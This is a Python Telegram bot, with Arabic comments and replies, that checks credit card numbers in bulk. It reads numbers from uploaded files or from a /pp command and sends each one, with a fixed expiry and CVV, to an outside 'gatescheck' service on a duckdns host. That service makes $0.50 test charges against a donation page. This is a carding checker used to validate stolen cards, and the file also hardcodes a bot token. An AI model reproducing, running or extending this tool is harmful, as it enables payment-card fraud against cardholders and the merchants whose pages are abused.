import os
import re
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# توكن البوت الخاص بك
TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'

# رابط API للتحقق من البطاقة
API_URL = "http://gatescheck.duckdns.org:7000/check"

# دالة للتحقق من حالة البطاقة عبر API
def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        result = response.json().get('result', 'غير معروف')
        return result
    except Exception as e:
        return f"خطأ في التحقق: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # تأكد من وجود مجلد 'downloads'
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        # قراءة الملف وفحص البطاقات
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                await update.message.reply_text(f"بطاقة: {line} - النتيجة: {result}")
            else:
                await update.message.reply_text(f"لم يتم العثور على رقم بطاقة في السطر: {line}")

    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('مرحبًا! أرسل لي ملف نصي ليتحقق من بطاقات الائتمان أو استخدم الأمر /pp للتحقق من بطاقة فردية.\nمثال: /pp 1234567890')

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("يرجى إرسال رقم البطاقة بعد الأمر /pp. مثال: /pp 1234567890")
            return
        card_number = context.args[0]
        result = check_card_api(card_number)
        await update.message.reply_text(f"نتيجة التحقق للبطاقة {card_number}: {result}")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {e}")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == '__main__':
    main()
